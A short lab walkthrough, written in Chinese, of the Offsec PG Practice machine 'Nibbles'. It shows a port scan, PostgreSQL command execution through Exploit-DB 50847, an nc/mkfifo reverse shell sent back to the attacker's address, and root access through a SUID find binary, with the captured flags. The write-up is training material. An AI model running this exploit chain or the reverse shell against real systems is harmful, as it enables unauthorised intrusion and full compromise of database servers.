###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Nibbles
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.196.47 -u 5000 -t 8000 --scripts -- -n -Pn -sVC 

Open 192.168.196.47:21
Open 192.168.196.47:22
Open 192.168.196.47:80
Open 192.168.196.47:5437

PORT     STATE SERVICE    REASON  VERSION
21/tcp   open  ftp        syn-ack vsftpd 3.0.3
22/tcp   open  ssh        syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http       syn-ack Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Enter a title, displayed at the top of the window.
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
5437/tcp open  postgresql syn-ack PostgreSQL DB 11.3 - 11.9
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
```

搜尋[edb-50847](https://www.exploit-db.com/exploits/50847)，先確認是否能成功使用whoami發現可以
```
┌──(kali㉿kali)-[~/pgplay]
└─$ searchsploit -m 50847

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 50847.py -i 192.168.196.47 -p 5437 -c whoami

[+] Connecting to PostgreSQL Database on 192.168.196.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _1e511cf083bf54b10da17e7e24ea39b1
[+] Command executed

postgres
```

再用reverseshell讓他彈回，在`/home/wilson`路徑得到local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp80

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 50847.py -i 192.168.196.47 -p 5437 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.171 80 >/tmp/f"

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
postgres@nibbles:/home/wilson$ cat local.txt
cat local.txt
6d9efbd7e86c5a1f86ca84b350e53c48
```

查看binaries，有find，參考[GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid)，在/root得proof.txt
```
postgres@nibbles:/home/wilson$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/find
/usr/bin/sudo
/usr/bin/umount

postgres@nibbles:/tmp$ install -m =xs $(which find) .
postgres@nibbles:/tmp$ /usr/bin/find . -exec /bin/sh -p \; -quit

# whoami
root
# cd /root
# cat proof.txt
0a4c76b1be65cd27ba02bca60244cc8b
```